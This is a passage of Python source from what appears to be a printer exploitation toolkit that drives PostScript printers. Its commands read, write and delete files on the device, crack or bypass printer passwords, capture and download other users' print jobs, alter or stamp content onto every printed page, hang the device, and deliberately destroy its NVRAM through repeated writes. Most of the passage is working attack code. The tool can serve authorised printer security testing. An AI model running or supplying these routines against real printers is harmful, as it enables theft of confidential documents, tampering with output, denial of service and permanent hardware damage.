get(self, path, size=None):\n        if not size:\n            size = self.file_exists(path)\n        if size != c.NONEXISTENT:\n            # read file, one byte at a time\n            str_recv = self.cmd('/byte (0) def\\n'\n                                + '/infile (' + path + ') (r) file def\\n'\n                                + '{infile read {byte exch 0 exch put\\n'\n                                + '(%stdout) (w) file byte writestring}\\n'\n                                + '{infile closefile exit} ifelse\\n'\n                                + '} loop', True, True, True)\n            return (size, str_recv)\n        else:\n            print(\"File not found.\")\n            return c.NONEXISTENT\n\n    # ------------------------[ put <local file> ]------------------------\n    def put(self, path, data, mode='w+'):\n        if self.iohack:  # brother devices without any writeable volumes\n            output().warning(\"Writing will probably fail on this device\")\n        # convert to PostScript-compatibe octal notation\n        data = ''.join(['\\\\{:03o}'.format(ord(char)) for char in data])\n        self.cmd('/outfile (' + path + ') (' + mode + ') file def\\n'\n                 + 'outfile (' + data + ') writestring\\n'\n                 + 'outfile closefile\\n', False)\n\n    # ------------------------[ append <file> <string> ]------------------\n    def append(self, path, data):\n        self.put(path, data, 'a+')\n\n    # ------------------------[ delete <file> ]---------------------------\n    def delete(self, arg):\n        path = self.rpath(arg)\n        self.cmd('(' + path + ') deletefile', False)\n\n    # ------------------------[ rename <old> <new> ]----------------------\n    def do_rename(self, arg):\n        arg = re.split(\"\\s+\", arg, 1)\n        if len(arg) > 1:\n            old = self.rpath(arg[0])\n            new = self.rpath(arg[1])\n            self.cmd('(' + old + ') (' + new + ') renamefile', False)\n        else:\n            self.onecmd(\"help rename\")\n\n    # define alias but do not show alias in help\n    do_mv = do_rename\n\n    def help_rename(self):\n        print(\"Rename remote file:  rename <old> <new>\")\n\n    # ====================================================================\n\n    # ------------------------[ id ]--------------------------------------\n    def do_id(self, *arg):\n        \"Show device information.\"\n        output().info(self.cmd('product print'))\n\n    # ------------------------[ version ]---------------------------------\n    def do_version(self, *arg):\n        \"Show PostScript interpreter version.\"\n        str_send = '(Dialect:  ) print\\n'\\\n            'currentpagedevice dup (PostRenderingEnhance) known {(Adobe\\\\n)   print}\\n'\\\n            '{serverdict       dup (execkpdlbatch)        known {(KPDL\\\\n)    print}\\n'\\\n            '{statusdict       dup (BRversion)            known {(BR-Script ) print\\n'\\\n            '/BRversion get ==}{(Unknown) print} ifelse} ifelse} ifelse\\n'\\\n            'currentsystemparams 11 {dup} repeat\\n'\\\n            '                     (Version:  ) print version           ==\\n'\\\n            '                     (Level:    ) print languagelevel     ==\\n'\\\n            '                     (Revision: ) print revision          ==\\n'\\\n            '                     (Serial:   ) print serialnumber      ==\\n'\\\n            '/SerialNumber known {(Number:   ) print /SerialNumber get ==} if\\n'\\\n            '/BuildTime    known {(Built:    ) print /BuildTime    get ==} if\\n'\\\n            '/PrinterName  known {(Printer:  ) print /PrinterName  get ==} if\\n'\\\n            '/LicenseID    known {(License:  ) print /LicenseID    get ==} if\\n'\\\n            '/PrinterCode  known {(Device:   ) print /PrinterCode  get ==} if\\n'\\\n            '/EngineCode   known {(Engine:   ) print /EngineCode   get ==} if'\n        output().info(self.cmd(str_send))\n\n    # ------------------------[ df ]--------------------------------------\n    def do_df(self, arg):\n        \"Show volume information.\"\n        output().df(('VOLUME', 'TOTAL SIZE', 'FREE SPACE', 'PRIORITY',\n                     'REMOVABLE', 'MOUNTED', 'HASNAMES', 'WRITEABLE', 'SEARCHABLE'))\n        for vol in self.vol_exists():\n            str_send = '(' + vol + ') devstatus dup {pop ' + '== ' * 8 + '} if'\n            lst_recv = self.cmd(str_send).splitlines()\n            values = (vol,) + tuple(lst_recv if len(lst_recv)\n                                    == 8 else ['-'] * 8)\n            output().df(values)\n\n    # ------------------------[ free ]------------------------------------\n    def do_free(self, arg):\n        \"Show available memory.\"\n        # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n        output().raw(\"RAM status\")\n        output().info(self.cmd('currentsystemparams dup dup dup\\n'\n                               + '/mb 1048576 def /kb 100 def /str 32 string def\\n'\n                               + '(size:   ) print /InstalledRam known {\\n'\n                               + '  /InstalledRam get dup mb div cvi str cvs print (.) print kb mod cvi str cvs print (M\\\\n) print}{pop (Not available\\\\n) print\\n'\n                               + '} ifelse\\n'\n                               + '(free:   ) print /RamSize known {\\n'\n                               + '  /RamSize get dup mb div cvi str cvs print (.) print kb mod cvi str cvs print (M\\\\n) print}{pop (Not available\\\\n) print\\n'\n                               + '} ifelse'))\n        # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n        output().raw(\"Virtual memory\")\n        output().info(self.cmd('vmstatus\\n'\n                               + '/mb 1048576 def /kb 100 def /str 32 string def\\n'\n                               + '(max:    ) print dup mb div cvi str cvs print (.) print kb mod cvi str cvs print (M\\\\n) print\\n'\n                               + '(used:   ) print dup mb div cvi str cvs print (.) print kb mod cvi str cvs print (M\\\\n) print\\n'\n                               + '(level:  ) print =='))\n        # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n        output().raw(\"Font cache\")\n        output().info(self.cmd('cachestatus\\n'\n                               + '/mb 1048576 def /kb 100 def /str 32 string def\\n'\n                               + '(blimit: ) print ==\\n'\n                               + '(cmax:   ) print ==\\n'\n                               + '(csize:  ) print ==\\n'\n                               + '(mmax:   ) print ==\\n'\n                               + '(msize:  ) print ==\\n'\n                               + '(bmax:   ) print ==\\n'\n                               + '(bsize:  ) print =='))\n        # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n        output().raw(\"User cache\")\n        output().info(self.cmd('ucachestatus\\n'\n                               + '/mb 1048576 def /kb 100 def /str 32 string def\\n'\n                               + '(blimit: ) print ==\\n'\n                               + '(rmax:   ) print ==\\n'\n                               + '(rsize:  ) print ==\\n'\n                               + '(bmax:   ) print ==\\n'\n                               + '(bsize:  ) print =='))\n\n    # ------------------------[ devices ]---------------------------------\n    def do_devices(self, arg):\n        \"Show available I/O devices.\"\n        str_send = '/str 128 string def (*) {print (\\\\n) print} str /IODevice resourceforall'\n        for dev in self.cmd(str_send).splitlines():\n            output().info(dev)\n            output().raw(self.cmd('(' + dev + ') currentdevparams {exch 128 string '\n                                  + 'cvs print (: ) print ==} forall') + os.linesep)\n\n    # ------------------------[ uptime ]----------------------------------\n    def do_uptime(self, arg):\n        \"Show system uptime (might be random).\"\n        str_recv = self.cmd('realtime ==')\n        try:\n            output().info(conv().elapsed(str_recv, 1000))\n        except ValueError:\n            output().info(\"Not available\")\n\n    # ------------------------[ date ]------------------------------------\n    def do_date(self, arg):\n        \"Show printer's system date and time.\"\n        str_send = '(%Calendar%) /IODevice resourcestatus\\n'\\\n                   '{(%Calendar%) currentdevparams /DateTime get print}\\n'\\\n                   '{(Not available) print} ifelse'\n        str_recv = self.cmd(str_send)\n        output().info(str_recv)\n\n    # ------------------------[ pagecount ]-------------------------------\n    def do_pagecount(self, arg):\n        \"Show printer's page counter:  pagecount <number>\"\n        output().raw(\"Hardware page counter: \", '')\n        str_send = 'currentsystemparams dup /PageCount known\\n'\\\n                   '{/PageCount get ==}{(Not available) print} ifelse'\n        output().info(self.cmd(str_send))\n\n    # ====================================================================\n\n    # ------------------------[ lock <passwd> ]---------------------------\n    def do_lock(self, arg):\n        \"Set startjob and system parameters password.\"\n        if not arg:\n            arg = eval(input(\"Enter password: \"))\n        self.cmd('<< /Password () '\n                 '/SystemParamsPassword (' + arg + ') '  # harmless settings\n                 '/StartJobPassword (' + arg + ') '     # alter initial vm!\n                 '>> setsystemparams', False)\n\n    # ------------------------[ unlock <passwd>|\"bypass\" ]----------------\n    def do_unlock(self, arg):\n        \"Unset startjob and system parameters password.\"\n        max = 2**20  # exhaustive key search max value\n        # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n        # note that only numeric passwords can be cracked right now\n        # according to the reference using 'reset' should also work:\n        # **********************************************************\n        # »if the system parameter password is forgotten, there is\n        # still a way to reset it [...] by passing a dictionary to\n        # setsystemparams in which FactoryDefaults is the only entry«\n        # **********************************************************\n        if not arg:\n            print(\"No password given, cracking.\")  # 140k tries/sec on lj4250!\n            output().chitchat(\"If this ain't successful, try 'unlock bypass'\")\n            arg = self.timeoutcmd('/min 0 def /max ' + str(max) + ' def\\n'\n                                  'statusdict begin {min 1 max\\n'\n                                  '  {dup checkpassword {== flush stop}{pop} ifelse} for\\n'\n                                  '} stopped pop', self.timeout * 100)\n        # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n        # superexec can be used to reset PostScript passwords on most devices\n        elif arg == 'bypass':\n            print(\"Resetting password to zero with super-secret PostScript magic\")\n            self.supercmd('<< /SystemParamsPassword (0)'\n                          ' /StartJobPassword (0) >> setsystemparams')\n            arg = '0'  # assume we have successfully reset the passwords to zero\n        # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n        # finally unlock device with user-supplied or cracked password\n        str_recv = self.cmd('{ << /Password (' + arg + ')\\n'\n                            '  /SystemParamsPassword ()\\n'  # mostly harmless\n                            '  /StartJobPassword ()\\n'  # permanent VM change\n                            '  >> setsystemparams\\n} stopped ==')\n        msg = \"Use the 'reset' command to restore factory defaults\"\n        if not 'false' in str_recv:\n            output().errmsg(\"Cannot unlock\", msg)\n        else:\n            output().raw(\"Device unlocked with password: \" + arg)\n\n    # ------------------------[ restart ]---------------------------------\n    def do_restart(self, arg):\n        \"Restart PostScript interpreter.\"\n        output().chitchat(\"Restarting PostScript interpreter.\")\n        # reset VM, might delete downloaded files and/or restart printer\n        self.globalcmd('systemdict /quit get exec')\n\n    # ------------------------[ reset ]-----------------------------------\n    def do_reset(self, arg):\n        \"Reset PostScript settings to factory defaults.\"\n        # reset system parameters -- only works if printer is turned off\n        ''' »A flag that, if set to true immediately before the printer is turned\n    off, causes all nonvolatile parameters to revert to their factory default\n    values at the next power-on. The set of nonvolatile parameters is product\n    dependent. In most products, 'PageCount' cannot be reset. If the job that\n    sets FactoryDefaults to true is not the last job executed straight before\n    power-off, the request is ignored; this reduces the chance that malicious\n    jobs will attempt to perform this operation.« '''\n        self.cmd('<< /FactoryDefaults true >> setsystemparams', False)\n        output().raw(\"Printer must be turned off immediately for changes to take effect.\")\n        output().raw(\"This can be accomplished, using the 'restart' command in PJL mode.\")\n\n    # ------------------------[ format ]----------------------------------\n    def do_format(self, arg):\n        \"Initialize printer's file system:  format <disk>\"\n        if not self.vol:\n            output().info(\"Set volume first using 'chvol'\")\n        else:\n            output().warning(\"Warning: Initializing the printer's file system will whipe-out all\")\n            output().warning(\"user data (e.g. stored jobs) on the volume. Press CTRL+C to abort.\")\n            if output().countdown(\"Initializing \" + self.vol + \" in...\", 10, self):\n                str_recv = self.cmd(\n                    'statusdict begin (' + self.vol + ') () initializedisk end', False)\n\n    # ------------------------[ disable ]---------------------------------\n    def do_disable(self, arg):\n        output().psonly()\n        before = 'true' in self.globalcmd('userdict /showpage known dup ==\\n'\n                                          '{userdict /showpage undef}\\n'\n                                          '{/showpage {} def} ifelse')\n        after = 'true' in self.cmd('userdict /showpage known ==')\n        if before == after:\n            output().info(\"Not available\")  # no change\n        elif before:\n            output().info(\"Printing is now enabled\")\n        elif after:\n            output().info(\"Printing is now disabled\")\n\n    # define alias but do not show alias in help\n    do_enable = do_disable\n\n    def help_disable(self):\n        print(\"Disable printing functionality.\")\n\n    # ------------------------[ destroy ]---------------------------------\n    def do_destroy(self, arg):\n        \"Cause physical damage to printer's NVRAM.\"\n        output().warning(\"Warning: This command tries to cause physical damage to the\")\n        output().warning(\"printer NVRAM. Use at your own risk. Press CTRL+C to abort.\")\n        if output().countdown(\"Starting NVRAM write cycle loop in...\", 10, self):\n            '''\n            ┌───────────────────────────────────────────────────────────┐\n            │               how to destroy your printer?                │\n            ├───────────────────────────────────────────────────────────┤\n            │ Older devices allow us to set system parameters within a  │\n            │ PostScript loop. New devices only write to the NVRAM once │\n            │ the print job finishes which slows down NVRAM exhaustion. │\n            │ To get the best of both worlds, we use a hybrid approach. │\n            ├───────────────────────────────────────────────────────────┤\n            │ Note that this will only work if /WaitTimeout survives a  │\n            │ reboot. Else we should use the /StartJobPassword instead. │\n            └───────────────────────────────────────────────────────────┘\n            '''\n            cycles = '100'  # number of nvram write cycles per loop\n            # large values kill old printers faster\n            for n in range(1, 1000000):\n                self.globalcmd('/value {currentsystemparams /WaitTimeout get} def\\n'\n                               '/count 0 def /new {count 2 mod 30 add} def\\n'\n                               '{ << /WaitTimeout new >> setsystemparams\\n'\n                               '  /count count 1 add def % increment\\n'\n                               '  value count ' + cycles + ' eq {exit} if\\n'\n                               '} loop', False)\n                self.chitchat(\"\\rNVRAM write cycles: \" +\n                              str(n*int(cycles)), '')\n            print()  # echo newline if we get this far\n\n    # ------------------------[ hang ]------------------------------------\n    def do_hang(self, arg):\n        \"Execute PostScript infinite loop.\"\n        output().warning(\"Warning: This command causes an infinite loop rendering the\")\n        output().warning(\"device useless until manual restart. Press CTRL+C to abort.\")\n        if output().countdown(\"Executing PostScript infinite loop in...\", 10, self):\n            self.cmd('{} loop', False)\n\n    # ====================================================================\n\n    # ------------------------[ overlay <file> ]--------------------------\n    def do_overlay(self, arg):\n        \"Put overlay image on all hard copies:  overlay <file>\"\n        if not arg:\n            arg = eval(input('File: '))\n        if arg.endswith('ps'):\n            data = file().read(arg)  # already ps/eps file\n        else:\n            self.chitchat(\n                \"For best results use a file from the overlays/ directory\")\n            data = self.convert(arg, 'eps')  # try to convert other file types\n        if data:\n            self.overlay(data)\n\n    # define alias\n    complete_overlay = printer.complete_lfiles  # files or directories\n\n    def overlay(self, data):\n        output().psonly()\n        size = conv().filesize(len(data)).strip()\n        self.chitchat(\"Injecting overlay data (\" +\n                      size + \") into printer memory\")\n        str_send = '{overlay closefile} stopped % free memory\\n'\\\n                   '/overlay systemdict /currentfile get exec\\n'\\\n                   + str(len(data)) + ' () /SubFileDecode filter\\n'\\\n                   '/ReusableStreamDecode filter\\n' + data + '\\n'\\\n                   'def % --------------------------------------\\n'\\\n                   '/showpage {save /showpage {} def overlay dup\\n'\\\n                   '0 setfileposition cvx exec restore systemdict\\n'\\\n                   '/showpage get exec} def'\n        self.globalcmd(str_send)\n\n    # ------------------------[ cross <text> <font> ]---------------------\n    def do_cross(self, arg):\n        arg = re.split(\"\\s+\", arg, 1)\n        if len(arg) > 1 and arg[0] in self.options_cross:\n            font, text = arg\n            text = text.strip('\"')\n            data = file().read(self.fontdir + font + \".pfa\") or \"\"\n            data += '\\n/' + font + ' findfont 50 scalefont setfont\\n'\\\n                    '80 185 translate 52.6 rotate 1.1 1 scale 275 -67 moveto\\n'\\\n                    '(' + text + ') dup stringwidth pop 2 div neg 0 rmoveto show'\n            self.overlay(data)\n        else:\n            self.onecmd(\"help cross\")\n\n    def help_cross(self):\n        print(\"Put printer graffiti on all hard copies:  cross <font> <text>\")\n        print(\"Read the docs on how to install custom fonts. Available fonts:\")\n        if len(self.options_cross) > 0:\n            last = sorted(self.options_cross)[-1]\n        for font in sorted(self.options_cross):\n            print((('└─ ' if font == last else '├─ ') + font))\n\n    fontdir = os.path.dirname(os.path.realpath(__file__))\\\n        + os.path.sep + 'fonts' + os.path.sep\n    options_cross = [os.path.splitext(font)[0] for font in (os.listdir(fontdir)\n                                                            if os.path.exists(fontdir) else []) if font.endswith('.pfa')]\n\n    def complete_cross(self, text, line, begidx, endidx):\n        return [cat for cat in self.options_cross if cat.startswith(text)]\n\n    # ------------------------[ replace <old> <new> ]---------------------\n    def do_replace(self, arg):\n        \"Replace string in documents to be printed:  replace <old> <new>\"\n        arg = re.split(\"\\s+\", arg, 1)\n        if len(arg) > 1:\n            output().psonly()\n            oldstr, newstr = self.escape(arg[0]), self.escape(arg[1])\n            self.globalcmd('/strcat {exch dup length 2 index length add string dup\\n'\n                           'dup 4 2 roll copy length 4 -1 roll putinterval} def\\n'\n                           '/replace {exch pop (' + newstr +\n                           ') exch 3 1 roll exch strcat strcat} def\\n'\n                           '/findall {{(' + oldstr +\n                           ') search {replace}{exit} ifelse} loop} def\\n'\n                           '/show       {      findall       systemdict /show       get exec} def\\n'\n                           '/ashow      {      findall       systemdict /ashow      get exec} def\\n'\n                           '/widthshow  {      findall       systemdict /widthshow  get exec} def\\n'\n                           '/awidthshow {      findall       systemdict /awidthshow get exec} def\\n'\n                           '/cshow      {      findall       systemdict /cshow      get exec} def\\n'\n                           '/kshow      {      findall       systemdict /kshow      get exec} def\\n'\n                           '/xshow      { exch findall exch  systemdict /xshow      get exec} def\\n'\n                           '/xyshow     { exch findall exch  systemdict /xyshow     get exec} def\\n'\n                           '/yshow      { exch findall exch  systemdict /yshow      get exec} def\\n')\n        else:\n            self.onecmd(\"help replace\")\n\n    # ------------------------[ capture <operation> ]---------------------\n    def do_capture(self, arg):\n        \"Capture further jobs to be printed on this device.\"\n        free = '5'  # memory limit in megabytes that must at least be free to capture print jobs\n        # record future print jobs\n        if arg.startswith('start'):\n            output().psonly()\n            # PRET commands themself should not be capture if they're performed within ≤ 10s idle\n            '''\n      ┌──────────┬───────────────────────────────┬───────────────┐\n      │ hooking: │       BeginPage/EndPage       │ overwrite all │\n      ├──────────┼───────────────────────────────┼───────────────┤\n      │ metadat: │               ✔               │       -       │\n      ├──────────┼───────────────────────────────┼───────┬───────┤\n      │ globals: │   we are already global(?)    │ need  │ none  │\n      ├──────────┼───────────────┬───────────────┼───────┴───────┤\n      │ capture: │  currentfile  │   %lineedit   │  currentfile  │\n      ├──────────┼───────┬───────┼───────┬───────┼───────┬───────┤\n      │ storage: │ nfile │ vfile │ nfile │ array │ vfile │ nfile │\n      ├──────────┼───────┼───────┼───────┼───────┼───────┼───────┤\n      │ package: │   ✔   │   ?   │   ✔   │   ?   │   ?   │   ✔   │\n      ├──────────┼───────┼───────┼───────┼───────┼───────┼───────┤\n      │ execute: │   ✔   │   ✔   │   ✔   │   -   │   ✔   │   ✔   │\n      └──────────┴───────┴───────┴───────┴───────┴───────┴───────┘\n      '''\n            str_send = 'true 0 startjob {                                                     \\n'\\\n                       '/setoldtime {/oldtime realtime def} def setoldtime                    \\n'\\\n                       '/threshold {realtime oldtime sub abs 10000 lt} def                    \\n'\\\n                       '/free {vmstatus exch pop exch pop 1048576 div '+free+' ge} def        \\n'\\\n                       '%---------------------------------------------------------------------\\n'\\\n                       '%--------------[ get current document as file object ]----------------\\n'\\\n                       '%---------------------------------------------------------------------\\n'\\\n                       '/document {(%stdin) (r) file /ReusableStreamDecode filter} bind def   \\n'\\\n                       '%---------------------------------------------------------------------\\n'\\\n                       '/capturehook {{                                                       \\n'\\\n                       '  threshold {(Within threshold - will not capture\\\\n) print flush     \\n'\\\n                       '  setoldtime                                                          \\n'\\\n                       '}{                                                                    \\n'\\\n                       '  setoldtime                                                          \\n'\\\n                       '  free not {(Out of memory\\\\n) print flush}{                          \\n'\\\n                       '  % (This job will be captured in memory\\\\n) print flush              \\n'\\\n                       '  setoldtime                                                          \\n'\\\n                       '  false echo                            % stop interpreter slowdown   \\n'\\\n                       '  /timestamp realtime def               % get time from interpreter   \\n'\\\n                       '  userdict /capturedict known not       % print jobs are saved here   \\n'\\\n                       '  {/capturedict 50000 dict def} if      % define capture dictionary   \\n'\\\n                       '  %-------------------------------------------------------------------\\n'\\\n                       '  %--------------[ save document to dict and print it ]---------------\\n'\\\n                       '  %-------------------------------------------------------------------\\n'\\\n                       '  capturedict timestamp document put    % store document in memory    \\n'\\\n                       '  capturedict timestamp get cvx exec    % print the actual document   \\n'\\\n                       '  clear cleardictstack                  % restore original vm state   \\n'\\\n                       '  %-------------------------------------------------------------------\\n'\\\n                       '  setoldtime                                                          \\n'\\\n                       '  } ifelse} ifelse} stopped} bind def                                 \\n'\\\n                       '<< /BeginPage {capturehook} bind >> setpagedevice                     \\n'\\\n                       '(Future print jobs will be captured in memory!)}                      \\n'\\\n                       '{(Cannot capture - unlock me first)} ifelse print'\n            output().raw(self.cmd(str_send))\n        # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n        # show captured print jobs\n        elif arg.startswith('list'):\n            # show amount of free virtual memory left to capture print jobs\n            vmem = self.cmd('vmstatus exch pop exch pop 32 string cvs print')\n            output().chitchat(\"Free virtual memory: \" + conv().filesize(vmem)\n                              + \" | Limit to capture: \" + conv().filesize(int(free) * 1048576))\n            output().warning(self.cmd('userdict /free known {free not\\n'\n                                      '{(Memory almost full, will not capture jobs anymore) print} if}\\n'\n                                      '{(Capturing print jobs is currently not active) print} ifelse'))\n            # get first 100 lines for each captured job\n            str_recv = self.cmd(\n                'userdict /capturedict known {capturedict\\n'\n                '{ exch realtime sub (Date: ) print == dup          % get time diff\\n'\n                '  resetfile (Size: ) print dup bytesavailable ==   % get file size\\n'\n                '  100 {dup 128 string readline {(%%) anchorsearch  % get metadata\\n'\n                '  {exch print (\\\\n) print} if pop}{pop exit} ifelse} repeat pop\\n'\n                '  (' + c.DELIMITER + '\\\\n) print\\n'\n                '} forall clear} if')\n            # grep for metadata in captured jobs\n            jobs = []\n            for val in [_f for _f in str_recv.split(c.DELIMITER) if _f]:\n                date = conv().timediff(item(re.findall('Date: (.*)', val)))\n                size = conv().filesize(item(re.findall('Size: (.*)', val)))\n                user = item(re.findall('For: (.*)', val))\n                name = item(re.findall('Title: (.*)', val))\n                soft = item(re.findall('Creator: (.*)', val))\n                jobs.append((date, size, user, name, soft))\n            # output metadata for captured jobs\n            if jobs:\n                output().joblist(('date', 'size', 'user', 'jobname', 'creator'))\n                output().hline(79)\n                for job in jobs:\n                    output().joblist(job)\n        # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n        # save captured print jobs\n        elif arg.startswith('fetch'):\n            jobs = self.cmd(\n                'userdict /capturedict known {capturedict {exch ==} forall} if').splitlines()\n            if not jobs:\n                output().raw(\"No jobs captured\")\n            else:\n                for job in jobs:\n                    # is basename sufficient to sanatize file names? we'll see…\n                    target, job = self.basename(\n                        self.target), self.basename(job)\n                    root = os.path.join('capture', target)\n                    lpath = os.path.join(root, job + '.ps')\n                    self.makedirs(root)\n                    # download captured job\n                    output().raw(\"Receiving \" + lpath)\n                    data = '%!\\n'\n                    data += self.cmd('/byte (0) def\\n'\n                                     'capturedict ' + job + ' get dup resetfile\\n'\n                                     '{dup read {byte exch 0 exch put\\n'\n                                     '(%stdout) (w) file byte writestring}\\n'\n                                     '{exit} ifelse} loop')\n                    data = conv().nstrip(data)  # remove carriage return chars\n                    print((str(len(data)) + \" bytes received.\"))\n                    # write to local file\n                    if lpath and data:\n                        file().write(lpath, data)\n            # be user-friendly and show some info on how to open captured jobs\n            reader = 'any PostScript reader'\n            if sys.platform == 'darwin':\n                reader = 'Preview.app'       # OS X\n            if sys.platform.startswith('linux'):\n                reader = 'Evince'    # Linux\n            if sys.platform in ['win32', 'cygwin']:\n                reader = 'GSview'  # Windows\n            self.chitchat(\"Saved jobs can be opened with \" + reader)\n        # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n        # reprint saved print jobs\n        elif arg.endswith('print'):\n            output().raw(self.cmd(\n                '/str 256 string def /count 0 def\\n'\n                '/increment {/count 1 count add def} def\\n'\n                '/msg {(Reprinting recorded job ) print count str\\n'\n                'cvs print ( of ) print total str cvs print (\\\\n) print} def\\n'\n                'userdict /capturedict known {/total capturedict length def\\n'\n                'capturedict {increment msg dup resetfile cvx exec} forall} if\\n'\n                'count 0 eq {(No jobs captured) print} if'))\n        # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n        # end capturing print jobs\n        elif arg.startswith('stop'):\n            output().raw(\"Stopping job capture, deleting recorded jobs\")\n            self.globalcmd('<< /BeginPage {} bind /EndPage {} bind >>\\n'\n                           'setpagedevice userdict /capturedict undef\\n')\n        else:\n            self.help_capture()\n\n    def help_capture(self):\n        print(\"Print job operations:  capture <operation>\")\n        print(\"  capture start   - Record future print jobs.\")\n        print(\"  capture stop    - End capturing print jobs.\")\n        print(\"  capture list    - Show captured print jobs.\")\n        print(\"  capture fetch   - Save captured print jobs.\")\n        print(\"  capture print   - Reprint saved print jobs.\")\n\n    options_capture = ('start', 'stop', 'list', 'fetch', 'print')\n\n    def complete_capture(self, text, line, begidx, endidx):\n        return [cat for cat in self.options_capture if cat.startswith(text)]\n\n    # ------------------------[ hold ]------------------------------------\n    def do_hold(self, arg):\n        \"Enable job retention.\"\n        output().psonly()\n        str_send = 'currentpagedevice (CollateDetails) get (Hold) get 1 ne\\n'\\\n                   '{/retention 1 def}{/retention 0 def} ifelse\\n'\\\n                   '<< /Collate true /CollateDetails\\n'\\\n                   '<< /Hold retention /Type 8 >> >> setpagedevice\\n'\\\n                   '(Job retention ) print\\n'\\\n                   'currentpagedevice (CollateDetails) get (Hold) get 1 ne\\n'\\\n                   '{(disabled.) print}{(enabled.) print} ifelse'\n        output().info(self.globalcmd(str_send))\n        self.chitchat(\n            \"On most devices, jobs can only be reprinted by a local attacker via the\")\n        self.chitchat(\n            \"printer's control panel. Stored jobs are sometimes accessible by PS/PJL\")\n        self.chitchat(\n            \"file system access or via the embedded web server. If your printer does\")\n        self.chitchat(\n            \"not support holding jobs try the more generic 'capture' command instead\")\n        # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n        '''\n    **************************** HP/KYOCERA ****************************\n    << /Collate true /CollateDetails <<         /Type 8 /Hold 1 >> >> setpagedevice  % quick copy (HP)\n    << /Collate true /CollateDetails <<         /Type 8 /Hold 2 >> >> setpagedevice  % stored job (HP)\n    << /Collate true /CollateDetails << /Mode 0 /Type 8 /Hold 1 >> >> setpagedevice  % quick copy (Kyocera)\n    << /Collate true /CollateDetails << /Mode 0 /Type 8 /Hold 2 >> >> setpagedevice  % stored job (Kyocera)\n    << /Collate true /CollateDetails << /Mode 0                 >> >> setpagedevice  % permanent job storage (Kyocera)\n    <<               /CollateDetails << /Hold 0 /Type 8         >> >> setpagedevice  % disable job retention (HP)\n\n    **************************** CANON *********************************\n    << /CNJobExecMode store >> setpagedevice\n    << /CNJobExecMode hold  >> setpagedevice\n\n    **************************** BROTHER *******************************\n    << /BRHold 2 /BRHoldType 0 >> setpagedevice\n\n    **************************** XEROX #1 ******************************\n    userdict /XJXsetraster known { 1 XJXsetraster } if\n\n    **************************** XEROX #2 ******************************\n    userdict begin /xerox$holdjob 1 def end\n    /EngExe /ProcSet resourcestatus\n    {pop pop /EngExe /ProcSet findresource /HoldJob known\n    {false /EngExe /ProcSet findresource /HoldJob get exec} if} if\n\n    **************************** TOSHIBA *******************************\n    /dscInfo where {\n      pop\n      dscInfo /For known {\n        <</TSBPrivate 100 string dup 0 (DSSC PRINT USERLOGIN=)\n          putinterval dup 21 dscInfo /For get putinterval\n        >> setpagedevice\n      } if\n      dscInfo /Title known {\n        <</TSBPrivate 100 string dup 0 (DSSC JOB NAME=)\n          putinterval dup 14 dscInfo /Title get putinterval\n        >> setpagedevice\n      } if\n    << /TSBPrivate (DSSC PRINT PRINTMODE=HOLD) >> setpagedevice\n    }{\n      << /TSBPrivate (DSSC PRINT USERLOGIN=CUPS User) >> setpagedevice\n      << /TSBPrivate (DSSC JOB NAME=CUPS Document)    >> setpagedevice\n      << /TSBPrivate (DSSC PRINT PRINTMODE=HOLD)      >> setpagedevice\n    } ifelse\"\n  '''\n\n    # ====================================================================\n\n    # ------------------------[ known <operator> ]-------------------------\n    def do_known(self, arg):\n        \"List supported PostScript operators:  known <operator>\"\n        if arg:\n            functionlist = {'User-supplied Operators': arg.split()}\n        else:\n            functionlist = operators.oplist\n\n# may want to find unknown ops using: systemdict {dup type /operatortype eq {exch == pop}{pop pop} ifelse} forall\n\n        # ask interpreter if functions are known to systemdict\n        for desc, funcs in sorted(functionlist.items()):\n            output().chitchat(desc)\n            commands = ['(' + func + ': ) print systemdict /'\n                        + func + ' known ==' for func in funcs]\n            str_recv = self.cmd(c.EOL.join(commands), False)\n            for line in str_recv.splitlines():\n                output().green(line) if \" true\" in line else output().warning(line)\n\n    # ------------------------[ search <key> ]----------------------------\n    def do_search(self, arg):\n        \"Search all dictionaries by key:  search <key>\"\n        output().info(\n            self.cmd('(' + arg + ') where {(' + arg + ') get ==} if'))\n\n    # ------------------------[ dicts ]-----------------------------------\n    def do_dicts(self, arg):\n        \"Return a list of dictionaries and their permissions.\"\n        output().info(\"acl   len   max   dictionary\")\n        output().info(\"────────────────────────────\")\n        for dict in self.options_dump:\n            str_recv = self.cmd('1183615869 ' + dict + '\\n'\n                                'dup rcheck {(r) print}{(-) print} ifelse\\n'\n                                'dup wcheck {(w) print}{(-) print} ifelse\\n'\n                                'dup xcheck {(x) print}{(-) print} ifelse\\n'\n                                '( ) print dup length 128 string cvs print\\n'\n                                '( ) print maxlength  128 string cvs print')\n            if len(str_recv.split()) == 3:\n                output().info(\"%-5s %-5s %-5s %s\" %\n                              tuple(str_recv.split() + [dict]))\n\n    # ------------------------[ dump <dict> ]-----------------------------\n    def do_dump(self, arg, resource=False):\n        \"Dump all values of a dictionary:  dump <dict>\"\n        dump = self.dictdump(arg, resource)\n        if dump:\n            output().psdict(dump)\n\n    def help_dump(self):\n        print(\"Dump dictionary:  dump <dict>\")\n        # print(\"If <dict> is empty, the whole dictionary stack is dumped.\")\n        print(\"Standard PostScript dictionaries:\")\n        if len(self.options_dump) > 0:\n            last = self.options_dump[-1]\n        for dict in self.options_dump:\n            print((('└─ ' if dict == last else '├─ ') + dict))\n\n    # undocumented ... what about proprietary dictionary names?\n    options_dump = ('systemdict', 'statusdict', 'userdict', 'globaldict',\n                    'serverdict', 'errordict', 'internaldict', 'currentpagedevice',\n                    'currentuserparams', 'currentsystemparams')\n\n    def complete_dump(self, text, line, begidx, endidx):\n        return [cat for cat in self.options_dump if cat.startswith(text)]\n\n    # define alias\n    complete_browse = complete_dump\n\n    def dictdump(self, dict, resource):\n        superexec = False  # 